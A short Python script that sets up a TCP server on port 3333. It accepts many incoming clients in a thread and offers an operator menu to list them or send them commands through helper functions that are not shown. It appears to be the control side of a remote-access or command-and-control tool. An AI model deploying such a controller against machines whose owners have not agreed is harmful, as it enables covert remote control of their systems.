from socket import *
from functions import menu, get_all_clients, command
import threading


def clients_manager(server):
    while True:
        client, addr = server.accept()
        clients.append([client,addr])

server = socket(AF_INET, SOCK_STREAM)
server.bind(("",3333))
server.listen(100)

clients = []
t = threading.Thread(target=clients_manager, args=(server,))
t.start()

while True:
    menu()
    try:
        option = int(input("[+] Commmand > "))
    except:
        print ("[-] Numbers only")
        continue

    if option == 1:
        get_all_clients(clients)

    elif option == 2:
        command(clients)